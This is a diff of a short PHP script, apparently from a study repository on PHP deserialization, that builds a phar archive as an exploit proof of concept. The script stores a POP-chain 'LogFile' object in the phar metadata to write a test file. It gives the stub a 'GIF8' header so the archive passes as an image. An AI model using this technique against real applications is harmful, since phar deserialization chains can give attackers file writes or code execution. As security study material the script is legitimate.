@@ -1,20 +1,21 @@
 <?php
 // Create the POP Chain
 
-class TestClass
+class LogFile
 {
     public function __construct(){
-        // Variables
+        $this->filename = '/Users/tsvetkoff/Programming/Github_repos/IppSec-PHP-Deserialization/expluatation/itWorks.txt';
+        $this->fcontents = 'IT WORKS!!!';
     }
 }
 
 // Create the Phar Archive
 $phar = new \Phar("test.phar");
 $phar->startBuffering();
-$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$phar->setStub("GIF8;<?php __HALT_COMPILER(); ?>");
 
 //Begin of serialization
-$payload = new TestClass();
+$payload = new LogFile();
 $phar->setMetadata($payload);
 
 //Zip file within the phar archive
